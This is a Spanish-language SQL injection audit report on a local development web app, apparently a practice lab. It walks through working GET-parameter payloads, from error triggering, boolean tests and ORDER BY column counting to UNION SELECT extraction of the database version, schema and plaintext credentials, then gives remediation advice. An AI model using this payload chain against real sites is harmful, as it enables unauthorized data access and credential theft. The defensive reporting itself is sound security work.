# Informe de auditoria SQLi

## Objetivo

Analizar `http://web.dev.local:8083` para identificar vulnerabilidades de inyeccion SQL y confirmar explotacion si existia.

## Resumen ejecutivo

Se confirmo una vulnerabilidad de **SQL Injection basada en error y UNION-based** en el parametro GET `id` del formulario principal.

La aplicacion concatena directamente el valor de `id` en una consulta SQL y expone errores de base de datos al cliente. Fue posible:

- provocar errores SQL visibles;
- alterar la logica de la consulta para devolver todos los registros;
- identificar el numero de columnas de la consulta;
- extraer metadatos de la base de datos;
- listar columnas de la tabla `users`;
- recuperar datos sensibles, incluidos nombres de usuario y contrasenas en texto claro.

## Superficie auditada

- URL base: `http://web.dev.local:8083/`
- Metodo vulnerable: `GET`
- Parametro vulnerable: `id`

## Evidencia de deteccion

### 1. Error SQL visible

Payload:

```text
/?id=1'&Submit=Submit
```

Resultado observado:

- respuesta con `Fatal error`;
- traza PHP visible;
- referencia a `mysqli_sql_exception`;
- ruta interna filtrada: `/var/www/html/low.php:11`.

Fragmento:

```text
Uncaught mysqli_sql_exception: You have an error in your SQL syntax ...
... in /var/www/html/low.php:11
```

Artefacto: `sqli_tests/quote.html`

### 2. Confirmacion booleana

Payload verdadero:

```text
/?id=1'+OR+'1'='1&Submit=Submit
```

Resultado:

- devolvio multiples registros de usuarios.

Payload falso:

```text
/?id=1'+AND+'1'='2&Submit=Submit
```

Resultado:

- no devolvio registros.

Artefactos:

- `sqli_tests/tautology.html`
- `sqli_tests/false_cond.html`

### 3. Numero de columnas

Payload valido:

```text
/?id=1'+ORDER+BY+2--+-&Submit=Submit
```

Payload invalido:

```text
/?id=1'+ORDER+BY+3--+-&Submit=Submit
```

Conclusion:

- la consulta original usa **2 columnas**.

## Evidencia de explotacion

### 1. UNION SELECT controlado

Payload:

```text
/?id=-1'+UNION+SELECT+'pwned','marker'--+-&Submit=Submit
```

Resultado:

```text
First name: pwned
Surname: marker
```

Artefacto: `sqli_tests/union2_marker.html`

### 2. Extraccion de metadatos

Payload para nombre de base de datos:

```text
/?id=-1'+UNION+SELECT+database(),'db'--+-&Submit=Submit
```

Resultado:

```text
First name: sqli_demo
Surname: db
```

Payload para version:

```text
/?id=-1'+UNION+SELECT+version(),'db'--+-&Submit=Submit
```

Resultado:

```text
First name: 10.11.14-MariaDB-ubu2204
Surname: db
```

Artefactos:

- `sqli_tests/union2_database.html`
- `sqli_tests/union2_version.html`

### 3. Enumeracion de tablas y columnas

Tabla identificada:

```text
users
```

Columnas identificadas en `users`:

- `user_id`
- `first_name`
- `last_name`
- `username`
- `password`
- `email`

Artefactos:

- `sqli_tests/union2_tables.html`
- `sqli_tests/union2_columns.html`

### 4. Extraccion de datos sensibles

Payload:

```text
/?id=-1'+UNION+SELECT+username,password+FROM+users--+-&Submit=Submit
```

Se recuperaron credenciales en texto claro. Ejemplos:

```text
admin : password123
jsmith : secret456
```

Artefacto: `sqli_tests/union2_dump_creds.html`

Tambien se pudieron extraer ids, nombres y usernames:

Artefacto: `sqli_tests/union2_dump_names.html`

## Impacto

La vulnerabilidad permite a un atacante no autenticado:

- leer informacion arbitraria de la base de datos;
- enumerar esquema y tablas;
- extraer credenciales y datos personales;
- usar errores detallados para afinar ataques posteriores.

El riesgo es **critico** por la combinacion de inyeccion explotable, fuga de errores y contrasenas en texto claro.

## Causa probable

La consulta usa interpolacion directa del parametro `id` sin parametrizacion ni validacion estricta. La exposicion del error indica ademas que el entorno esta configurado para mostrar excepciones SQL al cliente.

## Recomendaciones

1. Sustituir consultas dinamicas por sentencias preparadas con parametros enlazados.
2. Validar `id` como entero antes de consultar.
3. Desactivar la visualizacion de errores SQL en respuestas HTTP y registrar errores solo en el servidor.
4. Hashear contrasenas con un algoritmo robusto como `password_hash()` / bcrypt o Argon2.
5. Aplicar principio de minimo privilegio al usuario de base de datos.
6. Anadir pruebas automatizadas para inputs maliciosos comunes.

## Estado final

- Vulnerabilidad SQLi: **confirmada**
- Explotacion: **confirmada**
